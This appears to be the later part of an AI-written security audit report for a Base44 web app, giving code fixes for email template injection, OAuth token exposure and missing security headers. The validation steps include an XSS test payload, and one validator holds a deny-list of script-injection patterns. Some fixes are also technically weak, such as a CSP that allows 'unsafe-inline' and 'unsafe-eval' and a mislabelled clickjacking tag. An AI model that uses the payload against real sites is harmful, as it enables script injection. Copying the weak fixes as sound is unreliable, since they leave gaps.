### FIX #6: Escape Email Template Variables

**Problem:** Admin can inject HTML/JavaScript into email templates.

**Solution:** Properly escape template variables in email body.

**1. Update emailTemplates.js:**

```javascript
// Src/api/lib/emailTemplates.js

// Add HTML escaping function
function escapeHtml(unsafe) {
  return (unsafe || '')
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// UPDATED: Escape variables when substituting
export function fillTemplate(text, vars) {
  if (!text) return '';
  
  // Escape all variable values before substitution
  const escapedVars = {};
  for (const [key, value] of Object.entries(vars)) {
    if (typeof value === 'string') {
      escapedVars[key] = escapeHtml(value);
    } else {
      escapedVars[key] = value;
    }
  }
  
  // Substitute with escaped values
  return text.replace(/\{\{(\w+)\}\}/g, (_, key) => escapedVars[key] || '');
}

export async function sendTemplateEmail(templateType, vars, allMembers, t) {
  const templates = await loadTemplates();
  const template = templates[templateType];
  const defaults = DEFAULT_TEMPLATES[templateType] || { subject: '', body: '' };
  
  // Subject and body get escaped substitution
  const subject = fillTemplate(
    template?.subject || defaults.subject, 
    vars
  );
  
  const body = fillTemplate(
    template?.body || defaults.body, 
    vars
  );
  
  let generatedImageUrl = null;
  if (template?.use_image && template.image_url) {
    try {
      generatedImageUrl = await generateImageWithName(
        template.image_url,
        vars.member_name || '',
        template.name_x ?? 50,
        template.name_y ?? 50,
        template.name_font_size || 48,
        template.name_color || '#1a2a3a'
      );
    } catch {}
  }

  // Construct email body with escaped content
  const emailBody = generatedImageUrl
    ? `<div style="text-align:center;font-family:'DM Sans',sans-serif;"><img src="${escapeHtml(generatedImageUrl)}" style="max-width:100%;border-radius:12px;" /><p style="margin-top:16px;font-size:15px;line-height:1.6;color:#334155;">${body}</p></div>`
    : `<div style="font-family:'DM Sans',sans-serif;font-size:15px;line-height:1.6;color:#1e293b;">${body}</div>`;

  const emails = allMembers.filter(m => m.email && m.account_active !== false).map(m => m.email);
  for (const email of emails) {
    try { 
      await base44.integrations.Core.SendEmail({ 
        to: email, 
        subject: escapeHtml(subject),  // Escape subject too
        body: emailBody 
      }); 
    } catch (err) {
      console.error(`Failed to send email to ${email}:`, err);
    }
  }
  return generatedImageUrl;
}
```

**2. Add Server-Side Template Validation:**

```typescript
// base44/functions/validateEmailTemplate.ts

import { defineFunction, FunctionError } from "@base44/sdk";

export const validateEmailTemplate = defineFunction({
  name: "validateEmailTemplate",
  input: {
    type: "object",
    properties: {
      subject: { type: "string" },
      body: { type: "string" }
    },
    required: ["subject", "body"]
  },
  async handler(context, input) {
    try {
      // Check for suspicious patterns
      const suspiciousPatterns = [
        /<script/i,           // Script tags
        /javascript:/i,       // JavaScript protocol
        /on\w+\s*=/i,        // Event handlers (onload=, onclick=, etc)
        /<iframe/i,          // Iframes
        /eval\(/i,           // eval()
        /base64/i            // Base64 encoding (often used to hide malicious code)
      ];
      
      for (const pattern of suspiciousPatterns) {
        if (pattern.test(input.subject) || pattern.test(input.body)) {
          throw new FunctionError(
            "SUSPICIOUS_CONTENT",
            `Template contains potentially dangerous content: ${pattern}`
          );
        }
      }
      
      // Check placeholder format is correct
      const placeholderPattern = /\{\{(\w+)\}\}/g;
      const allowedPlaceholders = ["member_name"];
      
      let match;
      while ((match = placeholderPattern.exec(input.subject + input.body)) !== null) {
        if (!allowedPlaceholders.includes(match[1])) {
          throw new FunctionError(
            "INVALID_PLACEHOLDER",
            `Placeholder {{${match[1]}}} is not allowed. Allowed: {{${allowedPlaceholders.join("}}, {{"}}}`
          );
        }
      }
      
      return {
        success: true,
        message: "Template validation passed"
      };
      
    } catch (error) {
      if (error instanceof FunctionError) throw error;
      throw new FunctionError("VALIDATION_ERROR", "Failed to validate template");
    }
  }
});
```

**3. Update TemplateEditor to Validate:**

```javascript
// Src/api/Components/training/TemplateEditing.jsx

const save = async () => {
    setSaving(true);
    try {
      // Validate template before saving
      const validation = await base44.functions.validateEmailTemplate({
        subject: form.subject,
        body: form.body
      });
      
      if (!validation.success) {
        toast({ title: "Template validation failed", variant: "destructive" });
        setSaving(false);
        return;
      }
      
      // Rest of save logic
      const existing = templates[currentType];
      if (existing) {
        await base44.entities.EmailTemplate.update(existing.id, { 
          ...form, 
          updated_by: member.member_name 
        });
        setTemplates(prev => ({ ...prev, [currentType]: { ...prev[currentType], ...form } }));
      } else {
        const created = await base44.entities.EmailTemplate.create({ 
          ...form, 
          template_type: currentType, 
          updated_by: member.member_name 
        });
        setTemplates(prev => ({ ...prev, [currentType]: created }));
      }
      
      toast({ title: t("tmpl.saved") });
      onAudit('updated email template', t(`tmpl.${currentType}`));
    } catch (err) {
      toast({ title: err.message || t("msg.save_failed"), variant: "destructive" });
    }
    setSaving(false);
};
```

**Validation Steps:**

1. Create safe template:
   ```
   Subject: "Congratulations {{member_name}}!"
   Body: "You have completed training."
   Should save successfully
   ```

2. Try XSS injection:
   ```
   Subject: "Cert {{member_name}}"
   Body: "<script>alert('XSS')</script>"
   Returns: "Suspicious content detected"
   Rejected
   ```

3. Verify escaping in sent email:
   ```
   Create member: John <script>alert('xss')</script>
   Send email with {{member_name}}
   Email received with text: "John &lt;script&gt;..."
   Script tags HTML-escaped, not executed
   ```

---

### FIX #7: Improve OAuth Token Handling

**Problem:** OAuth tokens exposed in URL history, sessionStorage, and logs.

**Solution:** Use HttpOnly cookies, avoid URL parameters, add token rotation.

**1. Update app-params.js:**

```javascript
// Src/api/lib/app-params.js

const isNode = typeof window === 'undefined';
const windowObj = isNode ? { localStorage: new Map() } : window;
const storage = windowObj.localStorage;

const toSnakeCase = (str) => {
  return str.replace(/([A-Z])/g, '_$1').toLowerCase();
}

const getAppParamValue = (paramName, { defaultValue = undefined, removeFromUrl = false, sensitive = false } = {}) => {
  if (isNode) {
    return defaultValue;
  }
  
  const storageKey = `base44_${toSnakeCase(paramName)}`;
  const urlParams = new URLSearchParams(window.location.search);
  const searchParam = urlParams.get(paramName);
  
  if (removeFromUrl) {
    urlParams.delete(paramName);
    const newUrl = `${window.location.pathname}${urlParams.toString() ? `?${urlParams.toString()}` : ""
      }${window.location.hash}`;
    
    // Use replaceState to remove from history
    window.history.replaceState({}, document.title, newUrl);
  }
  
  if (searchParam) {
    // For sensitive params (tokens), use sessionStorage only, never localStorage
    if (sensitive) {
      sessionStorage.setItem(storageKey, searchParam);
      // Do NOT store in localStorage
      storage.removeItem(storageKey);
    } else {
      storage.setItem(storageKey, searchParam);
    }
    return searchParam;
  }
  
  // For sensitive params, check sessionStorage first
  if (sensitive) {
    const sessionValue = sessionStorage.getItem(storageKey);
    if (sessionValue) return sessionValue;
  }
  
  if (defaultValue) {
    if (sensitive) {
      sessionStorage.setItem(storageKey, defaultValue);
      storage.removeItem(storageKey);
    } else {
      storage.setItem(storageKey, defaultValue);
    }
    return defaultValue;
  }
  
  const storedValue = storage.getItem(storageKey);
  if (storedValue) {
    return storedValue;
  }
  
  return null;
}

const getAppParams = () => {
  if (getAppParamValue("clear_access_token", { sensitive: true }) === 'true') {
    sessionStorage.removeItem('base44_access_token');
    localStorage.removeItem('base44_access_token');
  }
  
  return {
    appId: getAppParamValue("app_id", { defaultValue: import.meta.env.VITE_BASE44_APP_ID }),
    
    // CHANGED: Mark token as sensitive - uses sessionStorage only
    token: getAppParamValue("access_token", { 
      removeFromUrl: true,
      sensitive: true  // ← NEW: Sensitive param
    }),
    
    fromUrl: getAppParamValue("from_url", { defaultValue: window.location.href }),
    functionsVersion: getAppParamValue("functions_version", { defaultValue: import.meta.env.VITE_BASE44_FUNCTIONS_VERSION }),
    appBaseUrl: getAppParamValue("app_base_url", { defaultValue: import.meta.env.VITE_BASE44_APP_BASE_URL }),
  }
}

export const appParams = {
  ...getAppParams()
}
```

**2. Update OauthConsent.jsx to avoid token in URLs:**

```javascript
// Src/api/Pages/OauthConsent.jsx

export default function OAuthConsent() {
  const ctx = new URLSearchParams(window.location.search).get("ctx");
  const [info, setInfo] = useState(null);
  // ... other state ...

  useEffect(() => {
    (async () => {
      let redirecting = false;
      try {
        if (!ctx) {
          setError("This authorization link is invalid or has expired.");
          return;
        }
        
        const infoHeaders = {};
        if (appParams.token) {
          infoHeaders.Authorization = "Bearer " + appParams.token;
        }
        
        // IMPORTANT: Do NOT pass token in query params
        // Use Authorization header instead
        const res = await fetch(
          `/api/apps/${appParams.appId}/mcp/consent-info?handle=${encodeURIComponent(ctx)}`,
          { 
            credentials: "include",
            headers: infoHeaders
            // ← Token in header, not URL
          },
        );
        
        if (!res.ok) {
          setError("This authorization link is invalid or has expired.");
          return;
        }
        
        const data = await res.json();
        
        if (!data.authenticated) {
          // FIXED: Do NOT include token in returnTo URL
          const returnTo = window.location.pathname + "?ctx=" + encodeURIComponent(ctx);
          const encoded = encodeURIComponent(returnTo);
          redirecting = true;
          window.location.href =
            (data.login_path || "/login") + "?returnTo=" + encoded + "&from_url=" + encoded;
          // ← returnTo now has no token
          return;
        }
        
        setInfo(data);
      } catch (e) {
        setError("Could not load this authorization request. Please try again.");
      } finally {
        if (!redirecting) setChecking(false);
      }
    })();
  }, [ctx]);

  const respond = async (action) => {
    setSubmitting(true);
    setError("");
    try {
      const headers = { "Content-Type": "application/json" };
      
      // Token in Authorization header, NOT in body or URL
      if (appParams.token) {
        headers.Authorization = "Bearer " + appParams.token;
      }
      
      const res = await fetch(
        `/api/apps/${appParams.appId}/mcp/authorize-grant`,
        {
          method: "POST",
          credentials: "include",
          headers,
          body: JSON.stringify({ ctx, action })
          // ← Token in header, not in JSON body
        }
      );
      
      // ... rest of handler ...
    }
  };
  
  // ... rest of component ...
}
```

**3. Add Authorization Header to all API Calls:**

```javascript
// Src/api/Base44Client.js

import { createClient } from '@base44/sdk';
import { appParams } from '@/lib/app-params';

const { appId, token, functionsVersion, appBaseUrl } = appParams;

// Create client with token in Authorization header
export const base44 = createClient({
  appId,
  token,  // SDK handles this in Authorization header
  functionsVersion,
  serverUrl: '',
  requiresAuth: false,
  appBaseUrl
});

// If manual fetch is needed, add token to headers:
export async function fetchWithAuth(url, options = {}) {
  const headers = {
    ...options.headers,
    'Content-Type': 'application/json'
  };
  
  // Add token to Authorization header, never in URL
  if (token) {
    headers.Authorization = `Bearer ${token}`;
  }
  
  return fetch(url, {
    ...options,
    headers,
    credentials: 'include'  // Include cookies
  });
}
```

**4. Add Referrer Policy:**

Update vite.config.js to add security headers:

```javascript
// vite.config.js

import base44 from "@base44/vite-plugin"
import react from '@vitejs/plugin-react'
import { defineConfig } from 'vite'

export default defineConfig({
  plugins: [
    base44({
      legacySDKImports: process.env.BASE44_LEGACY_SDK_IMPORTS === 'true',
      hmrNotifier: true,
      navigationNotifier: true,
      analyticsTracker: true,
      visualEditAgent: true
    }),
    react(),
  ],
  
  // NEW: Security headers via server config
  server: {
    headers: {
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'X-Content-Type-Options': 'nosniff'
    }
  }
});
```

**Validation Steps:**

1. OAuth redirect test:
   ```
   Login via OAuth
   Check browser history
   URL should NOT contain access_token
   DevTools Network tab shows Authorization header instead
   ```

2. Token storage test:
   ```
   Login and check sessionStorage
   base44_access_token should be present (cleared on tab close)
   Check localStorage
   No access tokens stored in localStorage
   ```

3. Referrer header test:
   ```
   Click link to external site from app
   Network shows Referer header WITHOUT token
   External server doesn't receive sensitive data
   ```

---

### FIX #8: Add Security Headers

**Problem:** Missing Content-Security-Policy, X-Frame-Options, and other security headers.

**Solution:** Configure security headers in server and HTML.

**1. Update index.html:**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#165d90" />
    
    <!-- NEW: Security Headers -->
    <!-- Prevent clickjacking -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    
    <!-- Restrict iframe embedding -->
    <meta http-equiv="Content-Security-Policy" content="
      default-src 'self';
      script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://media.base44.com;
      style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
      img-src 'self' data: https:;
      font-src 'self' https://fonts.gstatic.com;
      connect-src 'self' https:;
      frame-ancestors 'none';
      base-uri 'self';
      form-action 'self';
    " />
    
    <title>APOSENTO ALTO - Canva Training</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/api/main.jsx"></script>
  </body>
</html>
```

**2. Update vite.config.js with Server Headers:**

```javascript
// vite.config.js

import base44 from "@base44/vite-plugin"
import react from '@vitejs/plugin-react'
import { defineConfig } from 'vite'

export default defineConfig({
  plugins: [
    base44({
      legacySDKImports: process.env.BASE44_LEGACY_SDK_IMPORTS === 'true',
      hmrNotifier: true,
      navigationNotifier: true,
      analyticsTracker: true,
      visualEditAgent: true
    }),
    react(),
  ],
  
  // Security headers configuration
  server: {
    headers: {
      // Prevent clickjacking
      'X-Frame-Options': 'DENY',
      
      // Prevent MIME type sniffing
      'X-Content-Type-Options': 'nosniff',
      
      // Prevent XSS in older browsers
      'X-XSS-Protection': '1; mode=block',
      
      // Control referrer
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      
      // Enforce HTTPS
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
      
      // Control permissions
      'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
    }
  },
  
  preview: {
    headers: {
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      'X-XSS-Protection': '1; mode=block',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
      'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
    }
  }
});
```

**3. Create Security Headers Middleware (for production):**

```typescript
// base44/middleware/securityHeaders.ts

import { defineMiddleware } from "@base44/sdk";

export const securityHeadersMiddleware = defineMiddleware({
  name: "securityHeaders",
  
  async handler(context, next) {
    // Set security headers on response
    const response = await next();
    
    // Prevent clickjacking
    response.headers.set('X-Frame-Options', 'DENY');
    
    // Prevent MIME type sniffing
    response.headers.set('X-Content-Type-Options', 'nosniff');
    
    // Prevent XSS in older browsers
    response.headers.set('X-XSS-Protection', '1; mode=block');
    
    // Strict referrer policy
    response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
    
    // Enforce HTTPS (production only)
    if (Deno.env.get('ENVIRONMENT') === 'production') {
      response.headers.set(
        'Strict-Transport-Security',
        'max-age=31536000; includeSubDomains; preload'
      );
    }
    
    // Restrict permissions
    response.headers.set(
      'Permissions-Policy',
      'camera=(), microphone=(), geolocation=()'
    );
    
    // Content-Security-Policy
    response.headers.set('Content-Security-Policy', 
      "default-src 'self'; " +
      "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; " +
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
      "img-src 'self' data: https:; " +
      "font-src 'self' https://fonts.gstatic.com; " +
      "connect-src 'self' https:; " +
      "frame-ancestors 'none'; " +
      "base-uri 'self'; " +
      "form-action 'self';"
    );
    
    return response;
  }
});
```

**Validation Steps:**

1. Check CSP headers:
   ```bash
   curl -i https://app.example.com/ | grep -i "content-security"
   Should show CSP header
   ```

2. Test clickjacking protection:
   ```
   Try embedding in iframe:
   <iframe src="https://app.example.com/admin"></iframe>
   Browser console should show error about X-Frame-Options
   ```

3. Test MIME type sniffing protection:
   ```
   Upload .txt file with malicious JavaScript
   X-Content-Type-Options: nosniff prevents execution
   Browser treats as text, not script
   ```

---

## IMPLEMENTATION PRIORITY

### Week 1 - CRITICAL
- [ ] Remove hard-coded admin credentials (FIX #1)
- [ ] Implement backend authorization (FIX #2)
- [ ] Add file upload validation (FIX #4)

### Week 2 - HIGH  
- [ ] Hash access codes (FIX #3)
- [ ] Add URL validation (FIX #5)
- [ ] Add security headers (FIX #8)

### Week 3 - MEDIUM
- [ ] Template injection fixes (FIX #6)
- [ ] OAuth token handling (FIX #7)

---

## TESTING & VALIDATION CHECKLIST

- [ ] No hardcoded credentials in frontend
- [ ] All admin operations check backend authorization
- [ ] File uploads validated server-side
- [ ] Access codes hashed in database
- [ ] Certificate URLs whitelisted
- [ ] Email templates escaped
- [ ] OAuth tokens not in URLs
- [ ] Security headers present
- [ ] Audit logs complete
- [ ] Dependency audit passed
- [ ] OWASP Top 10 coverage verified

---

## ONGOING SECURITY MAINTENANCE

1. **Weekly:** Monitor audit logs for suspicious patterns
2. **Monthly:** Run `npm audit` and update packages
3. **Quarterly:** Penetration testing
4. **Quarterly:** Security training for team

---

**Report Prepared By:** Security Audit Agent  
**Status:** Ready for Remediation  
**Severity Escalation:** Recommend immediate implementation of Fixes #1-2
